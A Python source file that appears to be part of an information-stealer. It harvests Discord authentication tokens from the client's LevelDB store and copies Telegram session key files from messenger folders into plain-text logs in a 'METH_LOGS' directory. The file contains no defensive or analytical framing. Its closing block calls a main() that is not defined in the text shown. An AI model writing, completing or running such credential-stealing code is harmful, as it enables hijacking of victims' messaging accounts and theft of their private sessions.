import os
import leveldb
from pathlib import Path
from config.paths import MESSENGERS

LOG_DIR = Path("METH_LOGS")
LOG_DIR.mkdir(exist_ok=True)

def extract_discord_tokens(ldb_path):
    tokens = []
    try:
        db = leveldb.LevelDB(ldb_path)
        for key, value in db.RangeIter():
            try:
                val_str = value.decode('utf-8', errors='ignore')
                if "." in val_str and len(val_str.split(".")) == 3 and len(val_str) > 50:
                    tokens.append(val_str)
            except:
                pass
        return tokens
    except Exception as e:
        return [f"LevelDB error: {e}"]

def extract_telegram_sessions(base):
    sessions = []
    try:
        for root, dirs, files in os.walk(base):
            for file in files:
                if "key_data" in file or "map" in file or file.startswith("D877F783D5D3EF8C"):
                    full = os.path.join(root, file)
                    try:
                        with open(full, "rb") as f:
                            data = f.read(512)
                            sessions.append(f"File: {file}\nHex preview: {data.hex()}")
                    except:
                        pass
        return sessions
    except Exception as e:
        return [f"Error: {e}"]

def extract_messenger_data(name, base_path):
    base = os.path.expandvars(base_path)
    if not os.path.exists(base):
        return

    category_file = LOG_DIR / f"messengers_{name.lower().replace(' ', '_')}.txt"
    with open(category_file, "w", encoding="utf-8", errors="ignore") as log:
        log.write(f"=== {name} ===\n\n")
        log.write(f"Base path: {base}\n\n")

        if "discord" in name.lower():
            ldb_path = os.path.join(base, "Local Storage", "leveldb")
            if os.path.exists(ldb_path):
                log.write("--- Discord Tokens ---\n")
                tokens = extract_discord_tokens(ldb_path)
                for token in tokens:
                    log.write(f"{token}\n")
                if not tokens:
                    log.write("No tokens found\n")
                log.write("\n")

        if "telegram" in name.lower():
            log.write("--- Telegram Sessions ---\n")
            sessions = extract_telegram_sessions(base)
            for session in sessions:
                log.write(f"{session}\n\n")
            if not sessions:
                log.write("No sessions found\n")
            log.write("\n")

if __name__ == "__main__":
    main()